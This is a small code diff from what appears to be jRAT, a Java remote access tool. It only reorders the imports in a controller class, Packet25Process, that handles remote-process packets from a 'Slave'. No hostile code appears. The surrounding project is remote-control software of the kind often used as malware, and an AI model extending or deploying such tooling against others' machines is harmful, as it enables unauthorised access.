@@ -5,10 +5,11 @@ import jrat.controller.Slave;
 import jrat.controller.ui.frames.FrameControlPanel;
 import jrat.controller.ui.frames.FrameRemoteProcess;
 import jrat.controller.ui.panels.PanelControlRemoteProcess;
+
+import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
 import java.io.ByteArrayInputStream;
 import java.io.DataInputStream;
-import javax.imageio.ImageIO;
 
 public class Packet25Process extends AbstractIncomingPacket {
 
